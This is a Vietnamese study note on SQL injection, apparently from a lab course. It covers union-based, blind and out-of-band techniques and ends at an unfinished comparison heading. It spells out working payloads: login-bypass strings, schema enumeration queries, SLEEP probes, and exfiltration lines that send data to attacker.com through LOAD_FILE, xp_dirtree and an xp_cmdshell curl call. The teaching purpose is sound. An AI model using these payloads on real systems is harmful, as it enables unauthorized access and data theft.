# Introduction
- **SQL Injection (SQLi)** là một trong những lỗ hổng web **lâu đời nhất nhưng vẫn nguy hiểm nhất** trong bảo mật ứng dụng web. 
- Được xếp vào danh mục **OWASP A05:2025 - Injection**, SQLi xảy ra khi attacker có thể **can thiệp vào câu truy vấn SQL** mà ứng dụng gửi đến database.
- Hậu quả có thể rất nghiêm trọng — từ truy cập trái phép dữ liệu đến kiểm soát hoàn toàn database server.
## 🔷 A. SQL Injection Là Gì?

> Xảy ra khi ứng dụng web **nhúng trực tiếp input của user** vào câu truy vấn SQL mà **không kiểm tra/làm sạch** input đó, cho phép attacker **thay đổi logic của câu truy vấn**.

```
Bình thường:
SELECT * FROM users WHERE username = 'alice' AND password = '1234'

Khi bị SQLi:
SELECT * FROM users WHERE username = 'alice' --' AND password = 'anything'
                                              ↑ Comment out phần còn lại
```

---

## 🔷 B. Mức Độ Nguy Hiểm & Hậu Quả

|Hậu quả|Mô tả|
|---|---|
|**Truy cập dữ liệu trái phép**|Đọc thông tin nhạy cảm (password, thẻ tín dụng, PII)|
|**Bypass authentication**|Đăng nhập không cần mật khẩu|
|**Sửa/Xóa dữ liệu**|Modify hoặc delete records trong database|
|**Full server control**|Trong một số trường hợp, kiểm soát hoàn toàn database server|

> 📌 Dù là lỗ hổng **lâu đời nhất** trong web security, SQLi **vẫn tiếp tục xuất hiện** trong ứng dụng hiện đại và là **nguyên nhân gốc rễ** của nhiều vụ breach dữ liệu lớn ảnh hưởng hàng triệu người dùng.

---

## 🔷 C. Phân Loại SQL Injection — Tổng Quan

```
SQL Injection
├── In-Band SQLi (kết quả trả về trực tiếp trong response)
│   ├── Error-Based    → Khai thác thông báo lỗi database
│   └── Union-Based    → Dùng UNION để lấy dữ liệu từ bảng khác
│
├── Blind SQLi (không thấy kết quả trực tiếp)
│   ├── Authentication Bypass  → Bypass login mà không cần thấy data
│   ├── Boolean-Based          → Suy ra data từ True/False response
│   └── Time-Based             → Suy ra data từ thời gian response
│
└── Out-of-Band SQLi (dữ liệu được gửi qua kênh khác)
    → DNS lookup, HTTP request đến server attacker
```

---

## 🔷 D. Learning Objectives trong phần này

|#|Mục tiêu|
|---|---|
|1|Hiểu **tại sao** SQLi xảy ra trong web application|
|2|**Xác định và phát hiện** các điểm có thể inject|
|3|Khai thác **In-Band SQLi** (Error-Based & Union-Based)|
|4|Khai thác **Blind SQLi** (Auth Bypass, Boolean-Based, Time-Based)|
|5|Hiểu kỹ thuật **Out-of-Band SQLi**|
|6|Áp dụng **chiến lược phòng ngừa** SQLi|
# SQL Essentials  for Injection
- Trước khi học kỹ thuật SQL Injection, cần nắm vững **6 tính năng SQL cốt lõi** là nền tảng của mọi injection payload. 
- Đây không phải SQL cơ bản thông thường — đây là **những công cụ cụ thể mà attacker dùng** để thao túng query, trích xuất dữ liệu, và né tránh lỗi cú pháp
## 🔷 A. SQL Comments — "Cắt Đuôi" Query Gốc

**Cú pháp trong MySQL:**

|Loại comment|Cú pháp|Phạm vi|
|---|---|---|
|Single-line|`--` (có space sau)|Bỏ qua phần còn lại của dòng|
|Single-line|`#`|Bỏ qua phần còn lại của dòng|
|Multi-line|`/* */`|Bỏ qua đoạn được bao bọc|

**Tại sao quan trọng trong injection:**

sql

```sql
-- Query gốc:
SELECT * FROM users WHERE username='INPUT' AND password='secret';

-- Sau khi inject 'admin'-- vào username:
SELECT * FROM users WHERE username='admin'-- AND password='secret';
                                           ↑ Tất cả sau đây bị bỏ qua
-- Kết quả: password check không bao giờ chạy
```

> 🎯 Comment giải quyết vấn đề **"leftover SQL syntax"** — phần còn lại của query gốc sau payload thường gây lỗi cú pháp nếu không được comment out.
- "Leftover SQL Syntax" Problem
> Khi inject vào giữa query, phần sau payload thường là SQL hợp lệ của query gốc — nếu để nguyên sẽ gây lỗi cú pháp. Comment (`--`) giải quyết bằng cách **bỏ qua toàn bộ phần còn lại**.
---

## 🔷 B. UNION — Lấy Dữ Liệu Từ Bảng Khác

**Cú pháp:**

sql

```sql
SELECT name, age FROM students UNION SELECT username, id FROM admins;
```

**Quy tắc bắt buộc:**

> Cả hai SELECT phải trả về **cùng số cột** với **kiểu dữ liệu tương thích**

**Ứng dụng trong injection:**

sql

```sql
-- Query gốc chọn 3 cột:
SELECT id, name, price FROM products WHERE id = INPUT

-- Inject UNION để lấy data từ bảng users:
SELECT id, name, price FROM products WHERE id = 0 
UNION SELECT username, password, email FROM users--
                ↑ Phải đúng 3 cột
```

> 📌 **Nền tảng của Union-Based SQLi** — nếu query gốc chọn N cột, payload UNION SELECT cũng phải chọn đúng N giá trị.
- Column Count Matching (UNION)
> Yêu cầu bắt buộc của UNION — nếu không khớp số cột sẽ báo lỗi. Attacker thường dò số cột bằng cách thêm dần: `UNION SELECT NULL--`, `UNION SELECT NULL,NULL--`... cho đến khi không còn lỗi.

## 🔷 C. LIKE & Wildcards — Dò Dữ Liệu Từng Ký Tự

**Cú pháp:**

sql

```sql
SELECT * FROM users WHERE username LIKE 'adm%';
-- Trả về: admin, administrator, adm123...
```

**Hai wildcard:**

|Ký tự|Ý nghĩa|Ví dụ|
|---|---|---|
|`%`|Khớp với **mọi chuỗi** (0 hoặc nhiều ký tự)|`'adm%'` → admin, adm1|
|`_`|Khớp với **đúng 1 ký tự**|`'adm_n'` → admin|

**Ứng dụng trong Blind SQLi:**

sql

```sql
-- Dò từng ký tự của password:
LIKE 'a%'  → False
LIKE 'b%'  → False
...
LIKE 's%'  → True  ← Ký tự đầu là 's'
LIKE 'se%' → True  ← Ký tự thứ 2 là 'e'
...
```

---

## 🔷 D. LIMIT — Kiểm Soát Số Hàng Trả Về

**Cú pháp:**

sql

```sql
SELECT * FROM users LIMIT 1;       -- Chỉ lấy hàng đầu tiên
SELECT * FROM users LIMIT 2, 1;    -- Bỏ qua 2 hàng, lấy hàng thứ 3
```

**Format:** `LIMIT offset, count`

**Ứng dụng trong injection:**

sql

```sql
-- Lấy lần lượt từng hàng:
UNION SELECT username, password FROM users LIMIT 0,1  -- Hàng 1
UNION SELECT username, password FROM users LIMIT 1,1  -- Hàng 2
UNION SELECT username, password FROM users LIMIT 2,1  -- Hàng 3
```

> 📌 LIMIT giúp **kiểm soát chính xác** hàng nào được trả về — tránh bị overwhelmed bởi quá nhiều kết quả.

---

## 🔷 E. String Functions — Gom Dữ Liệu Hiệu Quả

**Hai hàm quan trọng nhất:**

**1. `GROUP_CONCAT()` — Gom nhiều hàng thành một chuỗi:**

sql

```sql
SELECT group_concat(username, ':', password SEPARATOR '<br>') FROM users;
-- Kết quả: admin:pass123<br>martin:secret<br>jim:work456
```

> ✅ **Lợi thế lớn:** Lấy **toàn bộ data trong một query** thay vì từng hàng một — đặc biệt hữu ích trong Union-Based SQLi khi chỉ có một "slot" để hiển thị.

**2. `CONCAT()` — Nối giá trị trong một hàng:**

sql

```sql
CONCAT(username, ':', password)
-- Kết quả: admin:pass123 (cho một hàng)
```

**So sánh:**

|Hàm|Dùng cho|Output|
|---|---|---|
|`GROUP_CONCAT()`|**Nhiều hàng**|Một chuỗi dài|
|`CONCAT()`|**Một hàng**|Một chuỗi ngắn|

---

## 🔷 F. `information_schema` — Bản Đồ Của Database

> **Mọi MySQL, MariaDB, PostgreSQL server** đều có database tích hợp này, chứa **metadata về mọi thứ** trên server.

**Hai bảng quan trọng nhất:**

|Bảng|Thông tin chứa|Cột quan trọng|
|---|---|---|
|`information_schema.tables`|Danh sách mọi bảng|`table_schema` (tên DB), `table_name` (tên bảng)|
|`information_schema.columns`|Danh sách mọi cột|`table_name`, `column_name`|

**Quy trình khai thác điển hình:**

sql

```sql
-- Bước 1: Tìm tên các database:
UNION SELECT schema_name FROM information_schema.schemata--

-- Bước 2: Tìm bảng trong database 'target_db':
UNION SELECT table_name FROM information_schema.tables 
WHERE table_schema='target_db'--

-- Bước 3: Tìm cột trong bảng 'users':
UNION SELECT column_name FROM information_schema.columns 
WHERE table_name='users'--

-- Bước 4: Lấy dữ liệu thật:
UNION SELECT username, password FROM users--
```

> 🎯 **`information_schema` là cầu nối** từ "tôi có thể inject" đến "tôi biết mọi bảng và cột trong database".
### 🔹 Metadata vs Data

> - **Metadata** (trong `information_schema`): thông tin VỀ database — tên bảng, tên cột, kiểu dữ liệu
> - **Data** (trong các bảng thật): nội dung thực sự — username, password, thông tin user  
>     Trong SQLi, **luôn phải lấy metadata trước** để biết structure, sau đó mới lấy data thật.
---

## 🔷 G. Lưu Ý Về Database Engine Khác

|Database|Comment syntax|System tables|
|---|---|---|
|**MySQL** (room này)|`--` , `#`, `/* */`|`information_schema`|
|**MSSQL**|`--`, `/* */`|`sys.tables`, `sys.columns`|
|**PostgreSQL**|`--`, `/* */`|`information_schema`|
|**SQLite**|`--`, `/* */`|`sqlite_master`|
|**Oracle**|`--`, `/* */`|`all_tables`, `all_columns`|

> 📌 **Core concepts giống nhau**, chỉ khác **cú pháp cụ thể**. Thành thạo MySQL → adapt sang engine khác dễ dàng.
# What is SQL Injection
- Phần này giải thích **tại sao và như thế nào** SQL Injection xảy ra — từ cách web application dùng SQL để tạo nội dung động, đến điểm yếu cốt lõi là **nối chuỗi input trực tiếp vào query**. 
- Tiếp theo là phân loại **3 nhóm SQLi chính** dựa trên cách attacker nhận feedback từ database, và các **kỹ thuật phát hiện cơ bản** mà pentester áp dụng để tìm điểm injection.
## 🔷 A. Cách Web Application Dùng SQL

**Ví dụ điển hình:**

```
URL: https://website.thm/article?id=1
         ↓
Server lấy giá trị "1" từ URL
         ↓
SELECT * FROM articles WHERE id = 1 AND public = 1;
         ↓
Database trả về article → Server render ra trang web
```

> 📌 **Đây là cách hầu hết ứng dụng web hoạt động:** user input → SQL query → kết quả trả về user. Đây cũng là nơi lỗ hổng tồn tại.

---

## 🔷 B. Điểm Yếu Cốt Lõi — String Concatenation
- String Concatenation — Nguyên Nhân Gốc Rễ
> Cách build SQL query bằng cách **nối chuỗi trực tiếp** (`"SELECT..." + userInput + "..."`) là nguyên nhân cơ bản nhất của SQLi. Khi input chứa ký tự SQL đặc biệt (như `'`), nó **phá vỡ cấu trúc query** và cho phép inject code mới.
**Code PHP dễ bị tấn công:**

php

```php
$query = "SELECT * FROM articles WHERE id = " . $_GET['id'] . " AND public = 1;";
```

> 🔴 **Vấn đề:** Input của user được **nối trực tiếp** vào SQL string — không qua bất kỳ kiểm tra hay xử lý nào.

**Khai thác với payload `?id=1 OR 1=1--`:**

sql

```sql
-- Query bị biến thành:
SELECT * FROM articles WHERE id = 1 OR 1=1-- AND public = 1;

-- Phân tích:
OR 1=1        → WHERE clause luôn TRUE → trả về MỌI hàng
--            → Comment out "AND public = 1" → cả bài viết private cũng lộ
```

---

## 🔷 C. Ba Loại SQL Injection

### **1. In-Band SQLi** — Kết quả trả về trực tiếp trong response

```
Attacker → Inject → Database → Kết quả hiển thị trong trang web ← Attacker đọc được
```

|Subtype|Cơ chế|Dấu hiệu|
|---|---|---|
|**Error-Based**|Database trả về error message chứa thông tin|Thấy error message trên trang|
|**Union-Based**|Dùng UNION để append query, lấy data qua page output|Thấy data lạ xuất hiện trên trang|

---

### **2. Blind SQLi** — Không thấy kết quả trực tiếp

```
Attacker → Inject → Database → KHÔNG có kết quả hiển thị
                              → Phải suy luận từ tín hiệu gián tiếp
```

|Subtype|Cơ chế|Tín hiệu nhận biết|
|---|---|---|
|**Authentication Bypass**|Query inject quyết định login thành công/thất bại|Đăng nhập được hay không|
|**Boolean-Based**|Response thay đổi nhẹ dựa trên điều kiện True/False|Nội dung trang khác nhau|
|**Time-Based**|Dùng `SLEEP()` để tạo độ trễ|Response chậm (True) vs nhanh (False)|
- `SLEEP()` — Công Cụ Time-Based Blind SQLi

> Hàm MySQL làm database **dừng xử lý** trong N giây. Attacker dùng nó để tạo signal: nếu response chậm hơn N giây = điều kiện TRUE, nhanh như bình thường = FALSE. Không cần thấy bất kỳ output nào.
---

### **3. Out-of-Band SQLi** — Dữ liệu qua kênh riêng biệt

```
Attacker → Inject → Database server → DNS lookup / HTTP request
                                      → Server của attacker nhận data
```

> 📌 Dùng khi **cả In-Band lẫn Blind đều không khả thi** — phụ thuộc vào tính năng đặc thù của database server (khả năng tạo network request).

---

## 🔷 D. Tổng Hợp 3 Loại SQLi

```
SQLi
├── In-Band (thấy kết quả trực tiếp)
│   ├── Error-Based    → Đọc error message
│   └── Union-Based    → Data xuất hiện trong trang
│
├── Blind (không thấy kết quả)
│   ├── Auth Bypass    → Login True/False
│   ├── Boolean-Based  → Response thay đổi nhẹ
│   └── Time-Based     → SLEEP() tạo độ trễ
│
└── Out-of-Band (kênh riêng)
    └── DNS/HTTP request → server attacker
```

---

## 🔷 E. Phát Hiện SQL Injection — Test Characters

**Các điểm injection cần kiểm tra:**

- URL parameters (`?id=1`, `?search=term`)
- Form fields (login, search, comment boxes)
- Cookies
- HTTP headers

**Bốn test characters cơ bản và ý nghĩa:**

|Payload|Mục đích|Dấu hiệu dương tính|
|---|---|---|
|`'` (single quote)|Phá vỡ cú pháp SQL string|Database error xuất hiện|
|`"` (double quote)|Tương tự nhưng cho query dùng double quote|Database error xuất hiện|
|`;--`|Test comment syntax có được xử lý không|Hành vi ứng dụng thay đổi|
|`OR 1=1`|Test xem input có nằm trong WHERE clause không|Kết quả thay đổi (nhiều hơn bình thường)|

**Quy trình phát hiện:**

```
Thử single quote (')
         ↓
Có error? → Có → In-Band SQLi có thể khai thác
         ↓
Không có error nhưng hành vi khác? → Blind SQLi
         ↓
Không có gì thay đổi? → Thử Time-Based (SLEEP)
         ↓
Vẫn không? → Điểm này có thể không vulnerable
              hoặc cần kỹ thuật khác
```

> ⚠️ **Không phải test nào cũng tạo visible error.** Nếu ứng dụng suppress errors → phải dựa vào **hành vi (Boolean)** hoặc **thời gian (Time-Based)** để xác nhận injection.
# In-band SQL Injection
- **In-Band SQL Injection** là loại SQLi **phổ biến và dễ khai thác nhất** — "In-Band" nghĩa là cùng một kênh HTTP được dùng để inject **và** nhận kết quả. 
- Có hai subtype: **Error-Based** (khai thác thông báo lỗi để lộ thông tin cấu trúc) và **Union-Based** (dùng UNION SELECT để trích xuất dữ liệu từ bất kỳ bảng nào). 
- Union-Based là phương pháp chính để trích xuất **lượng lớn dữ liệu** và tuân theo một quy trình **6 bước có hệ thống**.
## 🔷 A. Error-Based SQL Injection

**Cơ chế:** Ứng dụng hiển thị **raw database error** cho user → error message chứa thông tin có giá trị.

**Ví dụ error khi inject `'`:**

```
You have an error in your SQL syntax; check the manual that 
corresponds to your MySQL server version for the right syntax 
to use near ''1'' at line 1
```

**Thông tin lộ ra từ error này:**

|Thông tin|Suy luận|
|---|---|
|"MySQL server version"|Database engine là **MySQL**|
|"near ''1''"|Input được wrap trong **single quotes**|
|Error hiển thị thẳng ra trang|App **không handle errors gracefully**|

> 📌 Error-Based hữu ích để **hiểu cấu trúc query**, nhưng Union-Based mới là phương pháp chính để **trích xuất dữ liệu lớn**.

---

## 🔷 B. Union-Based SQL Injection — Quy Trình 6 Bước

### **Bước 1 — Xác Định Số Cột**

> UNION yêu cầu cả hai SELECT phải có **cùng số cột** — phải dò bằng cách thử dần.

sql

```sql
1 UNION SELECT 1          -- Error: sai số cột
1 UNION SELECT 1,2        -- Error: vẫn sai
1 UNION SELECT 1,2,3      -- ✅ Thành công! Query gốc có 3 cột
```

---

### **Bước 2 — Xác Định Cột Nào Hiển Thị Trên Trang**

> Không phải mọi cột đều được render ra trang web — cần biết **cột nào** có thể dùng để hiển thị data.

sql

```sql
0 UNION SELECT 1,2,3
```

> **Tại sao dùng `0`?** ID = 0 không tồn tại → query gốc trả về **empty result** → chỉ có output của UNION xuất hiện trên trang → dễ quan sát số nào hiển thị ở đâu.

```
Trang hiển thị: "3"  →  Cột thứ 3 là extraction column
```

---

### **Bước 3 — Lấy Tên Database Hiện Tại**

sql

```sql
0 UNION SELECT 1,2,database()
```

> Thay số ở extraction column bằng hàm `database()` → tên database hiện tại xuất hiện trên trang.

---

### **Bước 4 — Liệt Kê Các Bảng**

sql

```sql
0 UNION SELECT 1,2,group_concat(table_name) 
FROM information_schema.tables 
WHERE table_schema = 'database_name'
```

> Dùng `information_schema.tables` để lấy **tên tất cả bảng** trong database vừa tìm được.

---

### **Bước 5 — Liệt Kê Các Cột**

sql

```sql
0 UNION SELECT 1,2,group_concat(column_name) 
FROM information_schema.columns 
WHERE table_name = 'target_table'
```

> Sau khi xác định bảng quan trọng, dùng `information_schema.columns` để lấy **tên tất cả cột**.

---

### **Bước 6 — Trích Xuất Dữ Liệu Thật**

sql

```sql
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') 
FROM target_table
```

> Với tên bảng và cột đã biết, lấy **dữ liệu thực sự** — username và password dưới dạng dễ đọc.

---

## 🔷 C. Toàn Bộ Quy Trình Tổng Hợp

```
Bước 1: Dò số cột
         1 UNION SELECT 1,2,3 → Không error = 3 cột
                 ↓
Bước 2: Tìm cột hiển thị
         0 UNION SELECT 1,2,3 → Số nào hiện trên trang?
                 ↓
Bước 3: Lấy tên database
         0 UNION SELECT 1,2,database()
                 ↓
Bước 4: Liệt kê bảng
         0 UNION SELECT 1,2,group_concat(table_name) 
         FROM information_schema.tables WHERE table_schema='db_name'
                 ↓
Bước 5: Liệt kê cột của bảng target
         0 UNION SELECT 1,2,group_concat(column_name) 
         FROM information_schema.columns WHERE table_name='target'
                 ↓
Bước 6: Lấy dữ liệu
         0 UNION SELECT 1,2,group_concat(username,':',password) 
         FROM target_table
```

---

## 🔷 D. Lý Do Đằng Sau Từng Bước

| Kỹ thuật                     | Lý do                                                                        |
| ---------------------------- | ---------------------------------------------------------------------------- |
| Dò số cột bằng cách tăng dần | UNION **bắt buộc** hai SELECT phải cùng số cột — đây là quy tắc SQL          |
| Dùng `0` hoặc `-1` làm ID    | Cần query gốc trả về **empty result** để chỉ thấy UNION output               |
| Dùng `information_schema`    | Đây là **catalogue nội bộ** của database — biết mọi thứ về cấu trúc          |
| Dùng `group_concat()`        | Gom nhiều hàng thành **một chuỗi duy nhất** — hiển thị được trong một "slot" |
# Blind SQL Injection
**Blind SQL Injection** xảy ra khi ứng dụng **không hiển thị kết quả query hoặc error message** — nhưng injection vẫn hoạt động, database vẫn xử lý payload. Attacker phải **suy luận từ hành vi gián tiếp** của ứng dụng. 
## Authentication Bypass
- **Authentication Bypass** là ví dụ trực quan nhất của Blind SQLi: attacker không thấy data từ database, chỉ thấy một tín hiệu duy nhất — **đăng nhập thành công hay thất bại**.
### 🔷 A. Tại Sao Gọi Là "Blind"?

|                               | In-Band SQLi        | Blind SQLi                       |
| ----------------------------- | ------------------- | -------------------------------- |
| **Database xử lý injection?** | ✅ Có               | ✅ Có                            |
| **Thấy kết quả trực tiếp?**   | ✅ Có               | ❌ Không                         |
| **Cách nhận biết thành công** | Đọc data trên trang | Suy luận từ **hành vi ứng dụng** |

**Các tín hiệu gián tiếp trong Blind SQLi:**

- Đăng nhập được hay không?
- Nội dung trang thay đổi không?
- Response có chậm hơn không?
### 🔷 B. Cơ Chế Login Form Thông Thường

**Query điển hình:**

sql

```sql
SELECT * FROM users WHERE username='bob' AND password='secret123' LIMIT 1;
```

**Logic ứng dụng:**

```
Query trả về ít nhất 1 hàng → Credentials hợp lệ → Redirect đến dashboard
Query trả về 0 hàng        → Credentials sai    → Hiện "Invalid credentials"
```

> 📌 **Điểm mấu chốt:** Ứng dụng **không hiển thị data từ database** — chỉ check "có hàng nào trả về không?" → đây là tín hiệu duy nhất attacker có thể khai thác.

---

### 🔷 C. Attack — Bypass Không Cần Username/Password Hợp Lệ

**Payload inject vào username:** `' OR 1=1;--`  
**Password:** bất kỳ thứ gì

**Query bị biến thành:**

sql

```sql
SELECT * FROM users WHERE username='' OR 1=1;--' AND password='anything' LIMIT 1;
```

**Phân tích từng phần:**

|Phần|Tác dụng|
|---|---|
|`username=''`|Kiểm tra username rỗng → không match|
|`OR 1=1`|**Luôn TRUE** → toàn bộ WHERE clause trở thành TRUE|
|`;`|Kết thúc statement|
|`--`|Comment out **toàn bộ phần còn lại** kể cả password check|

**Kết quả:**

```
Database trả về MỌI hàng trong bảng users
         ↓
Ứng dụng thấy "có hàng trả về" → Đăng nhập thành công
         ↓
Login với tư cách user đầu tiên trong bảng (thường là admin)
```

---

### 🔷 D. Nhắm Đến Một User Cụ Thể

**Payload:** `admin'--` (khi biết username)  
**Password:** bất kỳ thứ gì

**Query bị biến thành:**

sql

```sql
SELECT * FROM users WHERE username='admin'--' AND password='anything' LIMIT 1;
```

```
'admin'    → Match đúng user admin
--         → Comment out password check hoàn toàn
         ↓
Database trả về hàng của admin
         ↓
Đăng nhập thành công với tư cách ADMIN — không cần biết password
```

---

### 🔷 E. Các Biến Thể Payload

|Payload|Dùng khi|
|---|---|
|`' OR 1=1;--`|Classic bypass — username wrap trong single quotes|
|`' OR 1=1#`|MySQL alternative — dùng `#` thay `--`|
|`" OR 1=1--`|Query dùng **double quotes** quanh input|
|`admin'--`|Biết username, muốn login thành account cụ thể|

> ⚠️ **Lưu ý thực tế:** Thử cả **username field lẫn password field** — một số ứng dụng chỉ concatenate một trong hai vào query, nên field vulnerable có thể khác nhau.

---

### 🔷 F. Quy Trình Phát Hiện Khi Pentest Login Form

```
Thử payload: username = ' OR 1=1;-- | password = anything
         ↓
Đăng nhập thành công? → Form VULNERABLE với SQLi Auth Bypass
         ↓
Đăng nhập thất bại? → Thử payload khác:
         - " OR 1=1--  (double quotes)
         - ' OR 1=1#   (MySQL comment alternative)
         - Thử vào password field thay vì username field
```
## Boolean and Time-based
- Khi authentication bypass chỉ giúp vượt qua login, **Boolean-Based** và **Time-Based Blind SQLi** cho phép **trích xuất dữ liệu thực sự** (username, password, toàn bộ database) ngay cả khi ứng dụng **không hiển thị bất kỳ output nào**. 
- Cả hai kỹ thuật đều hoạt động theo nguyên lý **hỏi database từng câu hỏi Yes/No**, nhưng khác nhau ở tín hiệu nhận được: **thay đổi nội dung trang** (Boolean) hoặc **thời gian response** (Time-Based). Dữ liệu được dò **từng ký tự một** — chậm nhưng đáng tin cậy.
### 🔷 A. Boolean-Based Blind SQLi

**Điều kiện áp dụng:** Ứng dụng trả về **tín hiệu nhị phân (binary signal)** — hai trạng thái khác nhau tùy theo điều kiện True/False.

**Ví dụ tín hiệu:**

|Tín hiệu|True|False|
|---|---|---|
|JSON response|`{"taken":true}`|`{"taken":false}`|
|Nội dung trang|Hiện article|Trang trống|
|HTML structure|Có element X|Không có element X|

---

**Ví dụ thực tế — Username check feature:**

```
https://website.thm/checkuser?username=admin    → {"taken":true}
https://website.thm/checkuser?username=xyz123   → {"taken":false}
```

**Query backend có thể:**

sql

```sql
SELECT * FROM users WHERE username = '%username%' LIMIT 1;
```

---

**Quy trình khai thác Boolean-Based (3 bước):**

**Bước 1 — Xác nhận injection hoạt động:**

sql

```sql
admin123' UNION SELECT 1,2,3 WHERE database() LIKE '%';--
```

```
% = wildcard khớp mọi thứ → Điều kiện luôn TRUE
→ Response: {"taken":true} = Injection hoạt động ✅
```

**Bước 2 — Dò tên database từng ký tự:**

sql

```sql
admin123' UNION SELECT 1,2,3 WHERE database() LIKE 'a%';-- → {"taken":false}
admin123' UNION SELECT 1,2,3 WHERE database() LIKE 'b%';-- → {"taken":false}
...
admin123' UNION SELECT 1,2,3 WHERE database() LIKE 's%';-- → {"taken":true} ← Ký tự 1 = 's'
admin123' UNION SELECT 1,2,3 WHERE database() LIKE 'sa%';-- → {"taken":false}
admin123' UNION SELECT 1,2,3 WHERE database() LIKE 'sb%';-- → {"taken":false}
...
admin123' UNION SELECT 1,2,3 WHERE database() LIKE 'sq%';-- → {"taken":true} ← Ký tự 2 = 'q'
```

> Tiếp tục cho đến khi dò được tên database đầy đủ (ví dụ: `sqli_db`).

**Bước 3 — Enumerate tables, columns, data:**

sql

```sql
-- Dò tên bảng:
admin123' UNION SELECT 1,2,3 FROM information_schema.tables 
WHERE table_schema = 'sqli_db' AND table_name LIKE 'a%';--

-- Dò tên cột (sau khi biết tên bảng):
admin123' UNION SELECT 1,2,3 FROM information_schema.columns 
WHERE table_name = 'users' AND column_name LIKE 'a%';--

-- Dò data thật (sau khi biết tên cột):
admin123' UNION SELECT 1,2,3 FROM users 
WHERE username LIKE 'a%';--
```

> 📌 **Cùng kỹ thuật, áp dụng lặp lại** — chỉ thay đổi target (database → table → column → data).

---

### 🔷 B. Time-Based Blind SQLi

**Điều kiện áp dụng:** Ứng dụng **không cho bất kỳ tín hiệu nào** — trang giống hệt nhau bất kể inject gì. Tín hiệu duy nhất: **thời gian response**.

**Công cụ cốt lõi — `SLEEP(n)`:**

sql

```sql
-- Nếu điều kiện TRUE → database dừng n giây → response chậm
-- Nếu điều kiện FALSE → response ngay lập tức
admin123' UNION SELECT SLEEP(5),2 WHERE database() LIKE 's%';--
```

```
Database name bắt đầu bằng 's'? 
→ TRUE  → SLEEP(5) → Response sau 5 giây  ← Tín hiệu TRUE
→ FALSE → Không SLEEP → Response ngay      ← Tín hiệu FALSE
```

---

**Quy trình Time-Based (2 bước):**

**Bước 1 — Xác định số cột:**

sql

```sql
admin123' UNION SELECT SLEEP(5);--      → Không có delay → Sai số cột
admin123' UNION SELECT SLEEP(5),2;--    → Delay 5 giây  → 2 cột! ✅
```

**Bước 2 — Enumerate data (giống Boolean, khác tín hiệu):**

sql

```sql
-- Dò ký tự đầu tiên của database name:
admin123' UNION SELECT SLEEP(5),2 WHERE database() LIKE 'a%';-- → Ngay lập tức → FALSE
admin123' UNION SELECT SLEEP(5),2 WHERE database() LIKE 'b%';-- → Ngay lập tức → FALSE
...
admin123' UNION SELECT SLEEP(5),2 WHERE database() LIKE 's%';-- → 5 giây → TRUE ✅
```

> ⚠️ **Cảnh báo quan trọng:** Network latency có thể gây **false positive** — độ trễ tự nhiên của mạng có thể trông giống SLEEP(). Giải pháp:
> 
> - Dùng **SLEEP(5-10)** thay vì SLEEP(1-2) để phân biệt rõ hơn
> - Test mỗi ký tự **vài lần** để xác nhận

---

### 🔷 C. So Sánh Boolean-Based vs Time-Based

|Tiêu chí|Boolean-Based|Time-Based|
|---|---|---|
|**Tín hiệu**|Thay đổi **nội dung/response**|**Thời gian** response|
|**Áp dụng khi**|App cho tín hiệu True/False|App **không** cho tín hiệu gì|
|**Tốc độ**|Nhanh hơn|Chậm hơn (mỗi request mất N giây)|
|**Độ tin cậy**|Cao|Có thể bị ảnh hưởng bởi network lag|
|**MySQL**|`LIKE` + response check|`SLEEP(n)`|
|**MSSQL**|Tương tự|`WAITFOR DELAY '0:0:5'`|

---

### 🔷 D. Khi Nào Dùng Kỹ Thuật Nào

| Tình huống                                         | Kỹ thuật phù hợp                 |
| -------------------------------------------------- | -------------------------------- |
| App hiển thị **nội dung khác nhau** cho True/False | **Boolean-Based**                |
| App response **giống hệt nhau** bất kể inject gì   | **Time-Based**                   |
| Time-based bị block hoặc **quá không tin cậy**     | **Out-of-Band** (task tiếp theo) |
# Out-of-band SQL Injection
- **Out-of-Band (OOB) SQL Injection** hoạt động theo cách **hoàn toàn khác** với các kỹ thuật trước — thay vì đọc kết quả qua HTTP response, attacker **ép database server chủ động kết nối ra ngoài** đến server do attacker kiểm soát, mang theo data bị đánh cắp qua **DNS hoặc HTTP**. 
- OOB là **phương án cuối cùng** khi mọi kỹ thuật khác đều thất bại, và chỉ khả thi khi database server **có thể tạo outbound network connection**.
## 🔷 A. Khi Nào Cần Dùng OOB

**Điều kiện OOB trở thành lựa chọn:**

|Tình huống|Trạng thái|
|---|---|
|**In-Band**|❌ App không hiển thị kết quả hay error|
|**Boolean-Based**|❌ Response giống hệt nhau bất kể điều kiện|
|**Time-Based**|❌ Mạng quá noisy hoặc `SLEEP()` bị block|
|**Database có outbound network access**|✅ **Điều kiện bắt buộc** để OOB hoạt động|

> 🔴 **Nếu firewall chặn toàn bộ outbound traffic từ DB server → OOB hoàn toàn vô dụng.**

---

## 🔷 B. Hai Kênh Hoạt Động Song Song

```
Kênh 1 — Attack channel:
Attacker ──── HTTP Request (với payload) ────► Web App ────► Database

Kênh 2 — Data channel (ngược chiều):
Database ──── DNS/HTTP request ────► Server của Attacker
              (data được nhúng vào request)
```

> 📌 **Điểm khác biệt cốt lõi:** Data **không đi qua HTTP response** của web app — nó đi qua **kênh mạng riêng biệt** do database server tạo ra.

---

## 🔷 C. DNS Exfiltration Với MySQL

**Payload:**

sql

```sql
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.attacker.com\\share'));
```

**Phân tích từng bước:**

```
Bước 1: (SELECT database()) → Lấy tên database, ví dụ: "webapp_db"
         ↓
Bước 2: CONCAT() → Tạo chuỗi: \\webapp_db.attacker.com\share
         ↓
Bước 3: LOAD_FILE() → Cố đọc file path đó
         ↓ (trên Windows)
Bước 4: Windows phải resolve DNS → Lookup "webapp_db.attacker.com"
         ↓
Bước 5: DNS server của attacker nhận request → Log "webapp_db"
         ↓
Data đã được exfiltrate! Tên database nằm trong subdomain
```

> ⚠️ **Điều kiện:** Hoạt động tốt nhất trên **Windows-based MySQL server** vì UNC path (`\\server\share`) kích hoạt DNS resolution tự động.

---

## 🔷 D. MSSQL Techniques

**Hai stored procedure quan trọng:**

**1. `xp_dirtree` — Trigger DNS lookup:**

sql

```sql
EXEC master..xp_dirtree '\\attacker.com\share';
```

> Cố liệt kê thư mục trên remote server → tự động trigger DNS lookup → **có sẵn mặc định** trong MSSQL.

**2. `xp_cmdshell` — Chạy OS command trực tiếp:**

sql

```sql
EXEC xp_cmdshell 'nslookup data.attacker.com';
EXEC xp_cmdshell 'curl http://attacker.com/?data=stolen_value';
```

> Chạy được bất kỳ lệnh hệ thống nào → mạnh nhất nhưng **bị tắt mặc định** trong MSSQL hiện đại.

**So sánh hai stored procedure:**

